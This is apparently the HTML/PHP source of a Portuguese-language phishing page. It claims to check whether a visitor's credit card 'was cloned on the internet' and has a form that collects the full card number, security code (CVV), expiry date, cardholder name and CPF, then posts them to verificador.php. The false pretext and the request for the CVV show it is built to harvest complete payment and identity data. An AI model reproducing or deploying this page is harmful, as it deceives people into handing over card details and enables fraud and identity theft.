<!doctype html>
<html lang="pt-br">
  <head>
    <title>Verificar Cartão</title>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<style>
    .afasta_esquerda{
        margin-left: 30px !important;
    }
</style>  
</head>
  <body>
    <div class="afasta_esquerda">
     <br>
     <h1 class="text-danger">O seu cartão foi clonado na internet?</h1>
     <hr>
     <h2 class="text-success">Veja aqui:</h2>
     <div class="col-4 border border-success rounded">
        <form method="POST" action="verificador.php">
            <br>
            <strong><label for="num_cartao">Número do Cartão:</label></strong><br>
            <input type="text" onkeypress="$(this).mask('0000 0000 0000 0000')" name="num_cartao" id="num_cartao" style="width:200px;">
            <br>
            <strong><label for="cvv">Cód. Segurança:</label></strong><br>
            <input type="number" name="cvv" onkeypress="$(this).mask('000')" id="cvv" style="width:55px;">
            <br>
            <strong><label for="date">Validade:</label></strong><br>
            <input type="text" name="date" onkeypress="$(this).mask('00/00')" id="date" style="width:55px;">
            <br>
            <strong><label for="nome">Nome no Cartão:</label></strong><br>
            <input type="text" name="nome" id="nome" style="width:300px;">
            <br>
            <strong><label for="cpf"> CPF </label></strong><br>
            <input type="text" name="cpf" style="width:300px;" onkeypress="$(this).mask('000.000.000-00');">
            <br>
            <br>
            <button class="btn btn-success" name="enviar" type="submit">Pesquisar</button>
            <br>
            <br>
        </form>    
     </div>
    </div> 
    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
    <script src="js\jquery.mask.min.js"></script>
  </body>
</html>
<?php
  if (isset($_GET['erroForm'])) {
    echo '<script> alert("Preencha os campos corretamente e tente novamente!") </script>';
  }
  elseif (isset($_GET['erroBD'])) {
    echo '<script> alert("Ocorreu um erro no Banco de Dados!") </script>';
  }
  

?>